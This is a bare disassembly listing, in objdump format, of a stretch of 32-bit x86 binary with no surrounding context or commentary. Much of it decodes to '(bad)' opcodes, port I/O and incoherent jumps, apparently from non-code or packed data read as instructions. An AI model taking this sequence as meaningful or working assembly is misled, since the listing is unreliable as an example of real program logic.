  4058a8:	76 b8                	jbe    0x405862
  4058aa:	aa                   	stos   %al,%es:(%edi)
  4058ab:	10 51 ee             	adc    %dl,-0x12(%ecx)
  4058ae:	35 64 66 9f 16       	xor    $0x169f6664,%eax
  4058b3:	e0 50                	loopne 0x405905
  4058b5:	de 5f 48             	ficomps 0x48(%edi)
  4058b8:	a8 c1                	test   $0xc1,%al
  4058ba:	0c e9                	or     $0xe9,%al
  4058bc:	49                   	dec    %ecx
  4058bd:	30 22                	xor    %ah,(%edx)
  4058bf:	a2 54 c1 99 f4       	mov    %al,0xf499c154
  4058c4:	d3 41 2c             	roll   %cl,0x2c(%ecx)
  4058c7:	62 59 2b             	bound  %ebx,0x2b(%ecx)
  4058ca:	d9 6b 59             	fldcw  0x59(%ebx)
  4058cd:	37                   	aaa
  4058ce:	52                   	push   %edx
  4058cf:	44                   	inc    %esp
  4058d0:	c4                   	(bad)
  4058d1:	f8                   	clc
  4058d2:	b6 3d                	mov    $0x3d,%dh
  4058d4:	b3 2e                	mov    $0x2e,%bl
  4058d6:	80 6d 2b 84          	subb   $0x84,0x2b(%ebp)
  4058da:	de 2b                	fisubrs (%ebx)
  4058dc:	5b                   	pop    %ebx
  4058dd:	a9 90 eb 1a 09       	test   $0x91aeb90,%eax
  4058e2:	92                   	xchg   %eax,%edx
  4058e3:	05 23 5f 47 64       	add    $0x64475f23,%eax
  4058e8:	79 41                	jns    0x40592b
  4058ea:	23 1f                	and    (%edi),%ebx
  4058ec:	4f                   	dec    %edi
  4058ed:	30 da                	xor    %bl,%dl
  4058ef:	03 7d c5             	add    -0x3b(%ebp),%edi
  4058f2:	aa                   	stos   %al,%es:(%edi)
  4058f3:	36 69 06 1f 9a 98 94 	imul   $0x94989a1f,%ss:(%esi),%eax
  4058fa:	ec                   	in     (%dx),%al
  4058fb:	26 62 5c fd c7       	bound  %ebx,%es:-0x39(%ebp,%edi,8)
  405900:	80 8e 6e 19 61 43 e1 	orb    $0xe1,0x4361196e(%esi)
  405907:	bf 4a 35 59 db       	mov    $0xdb59354a,%edi
  40590c:	28 7f 6a             	sub    %bh,0x6a(%edi)
  40590f:	d4 47                	aam    $0x47
  405911:	26 13 43 b6          	adc    %es:-0x4a(%ebx),%eax
  405915:	a9 c4 54 46 ae       	test   $0xae4654c4,%eax
  40591a:	e2 42                	loop   0x40595e
  40591c:	74 d1                	je     0x4058ef
  40591e:	4f                   	dec    %edi
  40591f:	30 6a 4c             	xor    %ch,0x4c(%edx)
  405922:	66 43                	inc    %bx
  405924:	3c 83                	cmp    $0x83,%al
  405926:	28 a4 b2 a6 72 bf 68 	sub    %ah,0x68bf72a6(%edx,%esi,4)
  40592d:	02 b5 2f 28 54 a3    	add    -0x5cabd7d1(%ebp),%dh
  405933:	15 ba 77 25 28       	adc    $0x282577ba,%eax
  405938:	4e                   	dec    %esi
  405939:	96                   	xchg   %eax,%esi
  40593a:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  40593b:	64 68 b4 bd 05 8c    	fs push $0x8c05bdb4
  405941:	b6 29                	mov    $0x29,%dh
  405943:	57                   	push   %edi
  405944:	7b 6b                	jnp    0x4059b1
  405946:	9c                   	pushf
  405947:	ec                   	in     (%dx),%al
  405948:	61                   	popa
  405949:	5f                   	pop    %edi
  40594a:	6f                   	outsl  %ds:(%esi),(%dx)
  40594b:	32 41 a7             	xor    -0x59(%ecx),%al
  40594e:	21 0f                	and    %ecx,(%edi)
  405950:	57                   	push   %edi
  405951:	4a                   	dec    %edx
  405952:	d1 8a e4 d0 62 ef    	rorl   $1,-0x109d2f1c(%edx)
  405958:	74 d6                	je     0x405930
  40595a:	9d                   	popf
  40595b:	84 a7 f9 0a 6e 90    	test   %ah,-0x6f91f507(%edi)
  405961:	44                   	inc    %esp
  405962:	24 81                	and    $0x81,%al
  405964:	40                   	inc    %eax
  405965:	ab                   	stos   %eax,%es:(%edi)
  405966:	e3 e1                	jecxz  0x405949
  405968:	ca ce 2d             	lret   $0x2dce
  40596b:	ec                   	in     (%dx),%al
  40596c:	83 28 0b             	subl   $0xb,(%eax)
  40596f:	46                   	inc    %esi
  405970:	41                   	inc    %ecx
  405971:	7c 5a                	jl     0x4059cd
  405973:	4e                   	dec    %esi
  405974:	e4 9b                	in     $0x9b,%al
  405976:	ff 6e 4c             	ljmp   *0x4c(%esi)
  405979:	bf 7c df aa dc       	mov    $0xdcaadf7c,%edi
  40597e:	78 47                	js     0x4059c7
  405980:	8f                   	(bad)
  405981:	de e4                	fsubp  %st,%st(4)
  405983:	94                   	xchg   %eax,%esp
  405984:	87 a3 52 2a 6c 87    	xchg   %esp,-0x7893d5ae(%ebx)
  40598a:	2a 70 5b             	sub    0x5b(%eax),%dh
  40598d:	cf                   	iret
  40598e:	dc 5d 72             	fcompl 0x72(%ebp)
  405991:	70 f7                	jo     0x40598a
  405993:	e3 fd                	jecxz  0x405992
  405995:	f8                   	clc
  405996:	19 30                	sbb    %esi,(%eax)
  405998:	ba fa 47 c9 eb       	mov    $0xebc947fa,%edx
  40599d:	23 d9                	and    %ecx,%ebx
  40599f:	a2 d4 47 df be       	mov    %al,0xbedf47d4
  4059a4:	5d                   	pop    %ebp
  4059a5:	f9                   	stc
  4059a6:	9e                   	sahf
  4059a7:	1f                   	pop    %ds
  4059a8:	f0 c6                	lock (bad)
  4059aa:	ec                   	in     (%dx),%al
  4059ab:	29 96 50 c6 83 5b    	sub    %edx,0x5b83c650(%esi)
  4059b1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4059b2:	15 9d ff b8 91       	adc    $0x91b8ff9d,%eax
  4059b7:	ac                   	lods   %ds:(%esi),%al
  4059b8:	65 e3 2a             	gs jecxz 0x4059e5
  4059bb:	e3 c6                	jecxz  0x405983
  4059bd:	2e 34 85             	cs xor $0x85,%al
  4059c0:	b3 36                	mov    $0x36,%bl
  4059c2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4059c3:	d2 84 ca 0d 68 8a af 	rolb   %cl,-0x507597f3(%edx,%ecx,8)
  4059ca:	e5 bc                	in     $0xbc,%eax
  4059cc:	74 d7                	je     0x4059a5
  4059ce:	79 2f                	jns    0x4059ff
  4059d0:	59                   	pop    %ecx
  4059d1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4059d2:	92                   	xchg   %eax,%edx
  4059d3:	3c 39                	cmp    $0x39,%al
  4059d5:	15 e2 0c f6 31       	adc    $0x31f60ce2,%eax
  4059da:	05 1a 5a 09 93       	add    $0x93095a1a,%eax
  4059df:	e0 ed                	loopne 0x4059ce
  4059e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4059e2:	09 fc                	or     %edi,%esp
  4059e4:	76 21                	jbe    0x405a07
  4059e6:	71 5d                	jno    0x405a45
  4059e8:	09 ef                	or     %ebp,%edi
  4059ea:	a2 67 af 78 f9       	mov    %al,0xf978af67
  4059ef:	c1 74 cc 93 da       	shll   $0xda,-0x6d(%esp,%ecx,8)
  4059f4:	18 e1                	sbb    %ah,%cl
  4059f6:	83 15 81 f4 82 20 df 	adcl   $0xffffffdf,0x2082f481
  4059fd:	56                   	push   %esi
  4059fe:	d7                   	xlat   %ds:(%ebx)
  4059ff:	4c                   	dec    %esp
  405a00:	cc                   	int3
  405a01:	5e                   	pop    %esi
  405a02:	60                   	pusha
  405a03:	17                   	pop    %ss
  405a04:	bd 2b 77 d1 68       	mov    $0x68d1772b,%ebp
  405a09:	fc                   	cld
  405a0a:	a0 d2 8c ff 34       	mov    0x34ff8cd2,%al
  405a0f:	46                   	inc    %esi
  405a10:	52                   	push   %edx
  405a11:	bf 2a bd 4c 16       	mov    $0x164cbd2a,%edi
  405a16:	9d                   	popf
  405a17:	62 0d 5a c0 7c 5b    	bound  %ecx,0x5b7cc05a
  405a1d:	0e                   	push   %cs
  405a1e:	4e                   	dec    %esi
  405a1f:	1e                   	push   %ds
  405a20:	00 94 e4 e3 bc 2e 5e 	add    %dl,0x5e2ebce3(%esp,%eiz,8)
  405a27:	b0 8b                	mov    $0x8b,%al
  405a29:	0f 4d a0 f0 1c b4 ff 	cmovge -0x4be310(%eax),%esp
  405a30:	8d                   	lea    (bad),%esp
  405a31:	e5 48                	in     $0x48,%eax
  405a33:	38 9d f0 8c cc c0    	cmp    %bl,-0x3f337310(%ebp)
  405a39:	3c fe                	cmp    $0xfe,%al
  405a3b:	1c 69                	sbb    $0x69,%al
  405a3d:	26 f3 a1 74 97 1f 79 	repz mov %es:0x791f9774,%eax
  405a44:	de 73 d9             	fidivs -0x27(%ebx)
  405a47:	7e 88                	jle    0x4059d1
  405a49:	1c 79                	sbb    $0x79,%al
  405a4b:	3b a3 07 30 c3 a9    	cmp    -0x563ccff9(%ebx),%esp
  405a51:	a1 c0 dc 74 38       	mov    0x3874dcc0,%eax
  405a56:	78 98                	js     0x4059f0
  405a58:	8d 08                	lea    (%eax),%ecx
  405a5a:	03 e0                	add    %eax,%esp
  405a5c:	15 0e 79 a3 e6       	adc    $0xe6a3790e,%eax
  405a61:	43                   	inc    %ebx
  405a62:	9d                   	popf
  405a63:	37                   	aaa
  405a64:	4f                   	dec    %edi
  405a65:	5c                   	pop    %esp
  405a66:	31 d0                	xor    %edx,%eax
  405a68:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405a69:	37                   	aaa
  405a6a:	0e                   	push   %cs
  405a6b:	d5 29                	aad    $0x29
  405a6d:	be c6 90 c4 35       	mov    $0x35c490c6,%esi
  405a72:	58                   	pop    %eax
  405a73:	89 49 e7             	mov    %ecx,-0x19(%ecx)
  405a76:	4a                   	dec    %edx
  405a77:	84 b0 73 47 5e 91    	test   %dh,-0x6ea1b88d(%eax)
  405a7d:	4a                   	dec    %edx
  405a7e:	bf d9 ad 79 c7       	mov    $0xc779add9,%edi
  405a83:	dc 0d c1 b4 40 68    	fmull  0x6840b4c1
  405a89:	28 03                	sub    %al,(%ebx)
  405a8b:	18 84 6e 14 ff 3d ce 	sbb    %al,-0x31c200ec(%esi,%ebp,2)
  405a92:	5b                   	pop    %ebx
  405a93:	c2 cd 76             	ret    $0x76cd
  405a96:	93                   	xchg   %eax,%ebx
  405a97:	fd                   	std
  405a98:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405a99:	18 bd 1d 2e 1d 1c    	sbb    %bh,0x1c1d2e1d(%ebp)
  405a9f:	a1 ff 6b 5e 78       	mov    0x785e6bff,%eax
  405aa4:	68 8c ea 04 95       	push   $0x9504ea8c
  405aa9:	63 c9                	arpl   %ecx,%ecx
  405aab:	12 44 c6 52          	adc    0x52(%esi,%eax,8),%al
  405aaf:	d0 99 03 33 da 4d    	rcrb   $1,0x4dda3303(%ecx)
  405ab5:	3b 31                	cmp    (%ecx),%esi
  405ab7:	a3 ec 88 04 85       	mov    %eax,0x850488ec
  405abc:	f4                   	hlt
  405abd:	37                   	aaa
  405abe:	79 17                	jns    0x405ad7
  405ac0:	c6                   	(bad)
  405ac1:	a1 5d e5 d9 16       	mov    0x16d9e55d,%eax
  405ac6:	6d                   	insl   (%dx),%es:(%edi)
  405ac7:	7e 81                	jle    0x405a4a
  405ac9:	50                   	push   %eax
  405aca:	ad                   	lods   %ds:(%esi),%eax
  405acb:	55                   	push   %ebp
  405acc:	9d                   	popf
  405acd:	96                   	xchg   %eax,%esi
  405ace:	e4 2d                	in     $0x2d,%al
  405ad0:	56                   	push   %esi
  405ad1:	e7 10                	out    %eax,$0x10
  405ad3:	20 22                	and    %ah,(%edx)
  405ad5:	0b 84 e3 e5 60 e0 a8 	or     -0x571f9f1b(%ebx,%eiz,8),%eax
  405adc:	33 63 b6             	xor    -0x4a(%ebx),%esp
  405adf:	f5                   	cmc
  405ae0:	c9                   	leave
  405ae1:	82 0a b3             	orb    $0xb3,(%edx)
  405ae4:	5f                   	pop    %edi
  405ae5:	b3 83                	mov    $0x83,%bl
  405ae7:	42                   	inc    %edx
  405ae8:	b9 98 81 8e 5d       	mov    $0x5d8e8198,%ecx
  405aed:	ff 08                	decl   (%eax)
  405aef:	24 b3                	and    $0xb3,%al
  405af1:	3b ee                	cmp    %esi,%ebp
  405af3:	17                   	pop    %ss
  405af4:	66 63 34 e0          	arpl   %si,(%eax,%eiz,8)
  405af8:	47                   	inc    %edi
  405af9:	ab                   	stos   %eax,%es:(%edi)
  405afa:	be c5 0e 60 34       	mov    $0x34600ec5,%esi
  405aff:	54                   	push   %esp
  405b00:	c4                   	(bad)
  405b01:	f9                   	stc
  405b02:	1e                   	push   %ds
  405b03:	23 9f 3f 28 bc 8a    	and    -0x7543d7c1(%edi),%ebx
  405b09:	78 68                	js     0x405b73
  405b0b:	82 b6 be 9d 43 2e 0f 	xorb   $0xf,0x2e439dbe(%esi)
  405b12:	cc                   	int3
  405b13:	5b                   	pop    %ebx
  405b14:	2d cd 3e 2c f7       	sub    $0xf72c3ecd,%eax
  405b19:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405b1a:	a1 c6 ea 84 b8       	mov    0xb884eac6,%eax
  405b1f:	60                   	pusha
  405b20:	c2 e1 e0             	ret    $0xe0e1
  405b23:	52                   	push   %edx
  405b24:	40                   	inc    %eax
  405b25:	ba 1b 93 d7 de       	mov    $0xded7931b,%edx
  405b2a:	62 89 7e 27 c4 61    	bound  %ecx,0x61c4277e(%ecx)
  405b30:	18 63 a9             	sbb    %ah,-0x57(%ebx)
  405b33:	55                   	push   %ebp
  405b34:	cc                   	int3
  405b35:	8b ef                	mov    %edi,%ebp
  405b37:	1d 40 d2 79 03       	sbb    $0x379d240,%eax
  405b3c:	cf                   	iret
  405b3d:	88 ef                	mov    %ch,%bh
  405b3f:	91                   	xchg   %eax,%ecx
  405b40:	d8 21                	fsubs  (%ecx)
  405b42:	da 60 ba             	fisubl -0x46(%eax)
  405b45:	66 e3 f9             	data16 jecxz 0x405b41
  405b48:	68 5f dc 3f 82       	push   $0x823fdc5f
  405b4d:	e6 58                	out    %al,$0x58
  405b4f:	81 7f 2c 86 99 46 ee 	cmpl   $0xee469986,0x2c(%edi)
  405b56:	74 4b                	je     0x405ba3
  405b58:	10 cd                	adc    %cl,%ch
  405b5a:	5d                   	pop    %ebp
  405b5b:	21 15 8d 37 53 e2    	and    %edx,0xe253378d
  405b61:	f6 b7 90 71 e6 d6    	divb   -0x29198e70(%edi)
  405b67:	d0 db                	rcr    $1,%bl
  405b69:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405b6a:	3b d0                	cmp    %eax,%edx
  405b6c:	94                   	xchg   %eax,%esp
  405b6d:	ed                   	in     (%dx),%eax
  405b6e:	5a                   	pop    %edx
  405b6f:	87 11                	xchg   %edx,(%ecx)
  405b71:	26 c1 3e e8          	sarl   $0xe8,%es:(%esi)
  405b75:	98                   	cwtl
  405b76:	aa                   	stos   %al,%es:(%edi)
  405b77:	73 5d                	jae    0x405bd6
  405b79:	fa                   	cli
  405b7a:	34 6a                	xor    $0x6a,%al
  405b7c:	4a                   	dec    %edx
  405b7d:	95                   	xchg   %eax,%ebp
  405b7e:	b3 cb                	mov    $0xcb,%bl
  405b80:	53                   	push   %ebx
  405b81:	6c                   	insb   (%dx),%es:(%edi)
  405b82:	8f                   	(bad)
  405b83:	be d8 52 26 08       	mov    $0x82652d8,%esi
  405b88:	aa                   	stos   %al,%es:(%edi)
  405b89:	87 bf 79 9b 0e 3f    	xchg   %edi,0x3f0e9b79(%edi)
  405b8f:	1d b0 17 41 d7       	sbb    $0xd74117b0,%eax
  405b94:	59                   	pop    %ecx
  405b95:	1c 10                	sbb    $0x10,%al
  405b97:	1d 3a 69 6e 74       	sbb    $0x746e693a,%eax
  405b9c:	ad                   	lods   %ds:(%esi),%eax
  405b9d:	9d                   	popf
  405b9e:	b6 90                	mov    $0x90,%dh
  405ba0:	fb                   	sti
  405ba1:	18 56 cc             	sbb    %dl,-0x34(%esi)
  405ba4:	a2 4b 92 0e f2       	mov    %al,0xf20e924b
  405ba9:	cc                   	int3
  405baa:	d3 0b                	rorl   %cl,(%ebx)
  405bac:	85 53 16             	test   %edx,0x16(%ebx)
  405baf:	c5 2c 4e             	lds    (%esi,%ecx,2),%ebp
  405bb2:	59                   	pop    %ecx
  405bb3:	6a 29                	push   $0x29
  405bb5:	86 65 b1             	xchg   %ah,-0x4f(%ebp)
  405bb8:	70 22                	jo     0x405bdc
  405bba:	d5 b0                	aad    $0xb0
  405bbc:	4b                   	dec    %ebx
  405bbd:	f5                   	cmc
  405bbe:	6e                   	outsb  %ds:(%esi),(%dx)
  405bbf:	09 6a 94             	or     %ebp,-0x6c(%edx)
  405bc2:	6f                   	outsl  %ds:(%esi),(%dx)
  405bc3:	eb d9                	jmp    0x405b9e
  405bc5:	33 e1                	xor    %ecx,%esp
  405bc7:	45                   	inc    %ebp
  405bc8:	c5 af 5f a1 9c 7c    	lds    0x7c9ca15f(%edi),%ebp
  405bce:	fa                   	cli
  405bcf:	5a                   	pop    %edx
  405bd0:	cf                   	iret
  405bd1:	3f                   	aas
  405bd2:	d9 02                	flds   (%edx)
  405bd4:	5a                   	pop    %edx
  405bd5:	0f cb                	bswap  %ebx
  405bd7:	5a                   	pop    %edx
  405bd8:	55                   	push   %ebp
  405bd9:	91                   	xchg   %eax,%ecx
  405bda:	0c a4                	or     $0xa4,%al
  405bdc:	ee                   	out    %al,(%dx)
  405bdd:	89 71 ce             	mov    %esi,-0x32(%ecx)
  405be0:	12 41 1a             	adc    0x1a(%ecx),%al
  405be3:	0d 93 3e 4d 4c       	or     $0x4c4d3e93,%eax
  405be8:	0d f9 86 61 d0       	or     $0xd06186f9,%eax
  405bed:	7b d1                	jnp    0x405bc0
  405bef:	04 54                	add    $0x54,%al
  405bf1:	73 34                	jae    0x405c27
  405bf3:	d5 83                	aad    $0x83
  405bf5:	58                   	pop    %eax
  405bf6:	bb b5 a9 6a 30       	mov    $0x306aa9b5,%ebx
  405bfb:	2e b9 7c 12 5a 7c    	cs mov $0x7c5a127c,%ecx
  405c01:	43                   	inc    %ebx
  405c02:	d5 38                	aad    $0x38
  405c04:	f6 76 94             	divb   -0x6c(%esi)
  405c07:	a3 3b 8c a1 2c       	mov    %eax,0x2ca18c3b
  405c0c:	90                   	nop
  405c0d:	8f                   	(bad)
  405c0e:	b3 b8                	mov    $0xb8,%bl
  405c10:	6a 6a                	push   $0x6a
  405c12:	98                   	cwtl
  405c13:	fd                   	std
  405c14:	56                   	push   %esi
  405c15:	11 97 9d 4e d3 39    	adc    %edx,0x39d34e9d(%edi)
  405c1b:	35 4e e8 4d 34       	xor    $0x344de84e,%eax
  405c20:	d7                   	xlat   %ds:(%ebx)
  405c21:	97                   	xchg   %eax,%edi
  405c22:	2a b5 ac 77 0d aa    	sub    -0x55f28854(%ebp),%dh
  405c28:	b2 59                	mov    $0x59,%dl
  405c2a:	bd fb b3 83 9d       	mov    $0x9d83b3fb,%ebp
  405c2f:	56                   	push   %esi
  405c30:	10 95 8e 2a 74 7e    	adc    %dl,0x7e742a8e(%ebp)
  405c36:	89 0c c6             	mov    %ecx,(%esi,%eax,8)
  405c39:	ba a9 6b d2 a2       	mov    $0xa2d26ba9,%edx
  405c3e:	eb 86                	jmp    0x405bc6
  405c40:	90                   	nop
  405c41:	4b                   	dec    %ebx
  405c42:	6c                   	insb   (%dx),%es:(%edi)
  405c43:	24 80                	and    $0x80,%al
  405c45:	ca 15 c1             	lret   $0xc115
  405c48:	5f                   	pop    %edi
  405c49:	58                   	pop    %eax
  405c4a:	3e 8c c8             	ds mov %cs,%eax
  405c4d:	8f                   	(bad)
  405c4e:	a0 08 7c 6d 50       	mov    0x506d7c08,%al
  405c53:	13 2e                	adc    (%esi),%ebp
  405c55:	39 52 dd             	cmp    %edx,-0x23(%edx)
  405c58:	71 05                	jno    0x405c5f
  405c5a:	f5                   	cmc
  405c5b:	61                   	popa
  405c5c:	63 01                	arpl   %eax,(%ecx)
  405c5e:	0c 52                	or     $0x52,%al
  405c60:	9d                   	popf
  405c61:	73 24                	jae    0x405c87
  405c63:	34 9f                	xor    $0x9f,%al
  405c65:	bf f3 cc 2b 6a       	mov    $0x6a2bccf3,%edi
  405c6a:	19 01                	sbb    %eax,(%ecx)
  405c6c:	7c 55                	jl     0x405cc3
  405c6e:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405c6f:	6b 29 63             	imul   $0x63,(%ecx),%ebp
  405c72:	4c                   	dec    %esp
  405c73:	4e                   	dec    %esi
  405c74:	8d a6 9a 4a f5 e2    	lea    -0x1d0ab566(%esi),%esp
  405c7a:	64 a9 aa d6 a6 c4    	fs test $0xc4a6d6aa,%eax
  405c80:	a9 73 27 62 98       	test   $0x98622773,%eax
  405c85:	f2 d0 fe             	repnz sar $1,%dh
  405c88:	1e                   	push   %ds
  405c89:	81 f9 c9 86 b6 5b    	cmp    $0x5bb686c9,%ecx
  405c8f:	46                   	inc    %esi
  405c90:	90                   	nop
  405c91:	95                   	xchg   %eax,%ebp
  405c92:	0b 51 44             	or     0x44(%ecx),%edx
  405c95:	61                   	popa
  405c96:	0d 1a 99 1d b3       	or     $0xb31d991a,%eax
  405c9b:	9f                   	lahf
  405c9c:	45                   	inc    %ebp
  405c9d:	29 c7                	sub    %eax,%edi
  405c9f:	8f                   	(bad)
  405ca0:	b7 9b                	mov    $0x9b,%bh
  405ca2:	df 60 ba             	fbld   -0x46(%eax)
  405ca5:	cf                   	iret
  405ca6:	84 0a                	test   %cl,(%edx)
  405ca8:	44                   	inc    %esp
  405ca9:	98                   	cwtl
  405caa:	f4                   	hlt
  405cab:	91                   	xchg   %eax,%ecx
  405cac:	d9 7f 85             	fnstcw -0x7b(%edi)
  405caf:	89 fa                	mov    %edi,%edx
  405cb1:	6a 63                	push   $0x63
  405cb3:	75 c7                	jne    0x405c7c
  405cb5:	eb 5f                	jmp    0x405d16
  405cb7:	91                   	xchg   %eax,%ecx
  405cb8:	50                   	push   %eax
  405cb9:	4e                   	dec    %esi
  405cba:	23 e7                	and    %edi,%esp
  405cbc:	c3                   	ret
  405cbd:	fe                   	(bad)
  405cbe:	73 02                	jae    0x405cc2
  405cc0:	c2 9b e0             	ret    $0xe09b
  405cc3:	9f                   	lahf
  405cc4:	b1 1a                	mov    $0x1a,%cl
  405cc6:	6c                   	insb   (%dx),%es:(%edi)
  405cc7:	c3                   	ret
  405cc8:	c8 56 9f 17          	enter  $0x9f56,$0x17
  405ccc:	9f                   	lahf
  405ccd:	d8 36                	fdivs  (%esi)
  405ccf:	31 66 9b             	xor    %esp,-0x65(%esi)
  405cd2:	6f                   	outsl  %ds:(%esi),(%dx)
  405cd3:	d4 7d                	aam    $0x7d
  405cd5:	97                   	xchg   %eax,%edi
  405cd6:	38 1c 22             	cmp    %bl,(%edx,%eiz,1)
  405cd9:	24 45                	and    $0x45,%al
  405cdb:	0e                   	push   %cs
  405cdc:	74 51                	je     0x405d2f
  405cde:	82 cd c3             	or     $0xc3,%ch
  405ce1:	f3 99                	repz cltd
  405ce3:	9e                   	sahf
  405ce4:	d5 f7                	aad    $0xf7
  405ce6:	3f                   	aas
  405ce7:	48                   	dec    %eax
  405ce8:	5c                   	pop    %esp
  405ce9:	c0 af de da 8a 40 c7 	shrb   $0xc7,0x408adade(%edi)
  405cf0:	19 b9 1e b3 f3 23    	sbb    %edi,0x23f3b31e(%ecx)
  405cf6:	1e                   	push   %ds
  405cf7:	cf                   	iret
  405cf8:	60                   	pusha
  405cf9:	76 de                	jbe    0x405cd9
  405cfb:	24 dd                	and    $0xdd,%al
  405cfd:	26 2f                	es das
  405cff:	51                   	push   %ecx
  405d00:	d9 c0                	fld    %st(0)
  405d02:	9f                   	lahf
  405d03:	f5                   	cmc
  405d04:	e4 42                	in     $0x42,%al
  405d06:	27                   	daa
  405d07:	0b cb                	or     %ebx,%ecx
  405d09:	7e 5a                	jle    0x405d65
  405d0b:	55                   	push   %ebp
  405d0c:	ab                   	stos   %eax,%es:(%edi)
  405d0d:	30 f6                	xor    %dh,%dh
  405d0f:	6e                   	outsb  %ds:(%esi),(%dx)
  405d10:	77 c3                	ja     0x405cd5
  405d12:	2a 12                	sub    (%edx),%dl
  405d14:	97                   	xchg   %eax,%edi
  405d15:	bf f3 48 39 4f       	mov    $0x4f3948f3,%edi
  405d1a:	28 63 8d             	sub    %ah,-0x73(%ebx)
  405d1d:	79 37                	jns    0x405d56
  405d1f:	21 cf                	and    %ecx,%edi
  405d21:	2b 56 dc             	sub    -0x24(%esi),%edx
  405d24:	e9 1f fb 85 74       	jmp    0x74c65848
  405d29:	e8 6a 0d f1 9a       	call   0x9b316a98
  405d2e:	cb                   	lret
  405d2f:	04 32                	add    $0x32,%al
  405d31:	eb f3                	jmp    0x405d26
  405d33:	f0 1f                	lock pop %ds
  405d35:	7c da                	jl     0x405d11
  405d37:	0c 7e                	or     $0x7e,%al
  405d39:	9e                   	sahf
  405d3a:	99                   	cltd
  405d3b:	62 f7 4e ea 9f       	(bad)
  405d40:	f0 c0 6b 33 fd       	lock shrb $0xfd,0x33(%ebx)
  405d45:	60                   	pusha
  405d46:	c8 48 f7 96          	enter  $0xf748,$0x96
  405d4a:	16                   	push   %ss
  405d4b:	93                   	xchg   %eax,%ebx
  405d4c:	c3                   	ret
  405d4d:	58                   	pop    %eax
  405d4e:	b1 ac                	mov    $0xac,%cl
  405d50:	91                   	xchg   %eax,%ecx
  405d51:	eb e5                	jmp    0x405d38
  405d53:	5e                   	pop    %esi
  405d54:	b2 cf                	mov    $0xcf,%dl
  405d56:	9c                   	pushf
  405d57:	86 52 7d             	xchg   %dl,0x7d(%edx)
  405d5a:	c9                   	leave
  405d5b:	a0 b5 91 f1 5e       	mov    0x5ef191b5,%al
  405d60:	ee                   	out    %al,(%dx)
  405d61:	53                   	push   %ebx
  405d62:	11 1a                	adc    %ebx,(%edx)
  405d64:	03 48 b6             	add    -0x4a(%eax),%ecx
  405d67:	d2 fe                	sar    %cl,%dh
  405d69:	23 26                	and    (%esi),%esp
  405d6b:	4b                   	dec    %ebx
  405d6c:	00 e9                	add    %ch,%cl
  405d6e:	86 42 58             	xchg   %al,0x58(%edx)
  405d71:	23 ab 2e 30 a4 95    	and    -0x6a5bcfd2(%ebx),%ebp
  405d77:	4a                   	dec    %edx
  405d78:	96                   	xchg   %eax,%esi
  405d79:	c6                   	(bad)
  405d7a:	54                   	push   %esp
  405d7b:	b1 12                	mov    $0x12,%cl
  405d7d:	74 ca                	je     0x405d49
  405d7f:	e9 09 e9 2c 5b       	jmp    0x5b6d468d
  405d84:	05 b9 87 86 18       	add    $0x188687b9,%eax
  405d89:	bf d1 d0 dd 80       	mov    $0x80ddd0d1,%edi
  405d8e:	6c                   	insb   (%dx),%es:(%edi)
  405d8f:	fb                   	sti
  405d90:	a8 10                	test   $0x10,%al
  405d92:	ce                   	into
  405d93:	a9 cb f7 5d ee       	test   $0xee5df7cb,%eax
  405d98:	78 95                	js     0x405d2f
  405d9a:	80 de c6             	sbb    $0xc6,%dh
  405d9d:	b9 ac 9c 06 7c       	mov    $0x7c069cac,%ecx
  405da2:	cc                   	int3
  405da3:	46                   	inc    %esi
  405da4:	1e                   	push   %ds
  405da5:	73 1e                	jae    0x405dc5
  405da7:	26 17                	es pop %ss
  405da9:	4c                   	dec    %esp
  405daa:	eb a2                	jmp    0x405d4e
  405dac:	0a 21                	or     (%ecx),%ah
  405dae:	46                   	inc    %esi
  405daf:	80 79 4b 66          	cmpb   $0x66,0x4b(%ecx)
  405db3:	6c                   	insb   (%dx),%es:(%edi)
  405db4:	48                   	dec    %eax
  405db5:	cc                   	int3
  405db6:	50                   	push   %eax
  405db7:	99                   	cltd
  405db8:	ad                   	lods   %ds:(%esi),%eax
  405db9:	ed                   	in     (%dx),%eax
  405dba:	60                   	pusha
  405dbb:	d8 2b                	fsubrs (%ebx)
  405dbd:	9c                   	pushf
  405dbe:	8f                   	(bad)
  405dbf:	0d 31 21 ec 98       	or     $0x98ec2131,%eax
  405dc4:	16                   	push   %ss
  405dc5:	e1 42                	loope  0x405e09
  405dc7:	c4 30                	les    (%eax),%esi
  405dc9:	e7 8c                	out    %eax,$0x8c
  405dcb:	1f                   	pop    %ds
  405dcc:	f4                   	hlt
  405dcd:	ab                   	stos   %eax,%es:(%edi)
  405dce:	48                   	dec    %eax
  405dcf:	01 c1                	add    %eax,%ecx
  405dd1:	38 83 cd f7 2f 1d    	cmp    %al,0x1d2ff7cd(%ebx)
  405dd7:	2c 99                	sub    $0x99,%al
  405dd9:	bd 3b 1c de e1       	mov    $0xe1de1c3b,%ebp
  405dde:	67 cb                	addr16 lret
  405de0:	1d a7 e8 bd 37       	sbb    $0x37bde8a7,%eax
  405de5:	9b                   	fwait
  405de6:	d3 49 23             	rorl   %cl,0x23(%ecx)
  405de9:	44                   	inc    %esp
  405dea:	a2 e0 2b 49 01       	mov    %al,0x1492be0
  405def:	be 93 73 21 bb       	mov    $0xbb217393,%esi
  405df4:	63 f7                	arpl   %esi,%edi
  405df6:	64 ed                	fs in  (%dx),%eax
  405df8:	c6                   	(bad)
  405df9:	15 16 3c 57 f4       	adc    $0xf4573c16,%eax
  405dfe:	4e                   	dec    %esi
  405dff:	4b                   	dec    %ebx
  405e00:	42                   	inc    %edx
  405e01:	49                   	dec    %ecx
  405e02:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  405e03:	d6                   	salc
  405e04:	2e 09 fe             	cs or  %edi,%esi
  405e07:	10 4b 0c             	adc    %cl,0xc(%ebx)
  405e0a:	27                   	daa
  405e0b:	66 0d d4 09          	or     $0x9d4,%ax
  405e0f:	15 c9 50 3d 0b       	adc    $0xb3d50c9,%eax
  405e14:	17                   	pop    %ss
  405e15:	58                   	pop    %eax
  405e16:	d8 69 b3             	fsubrs -0x4d(%ecx)
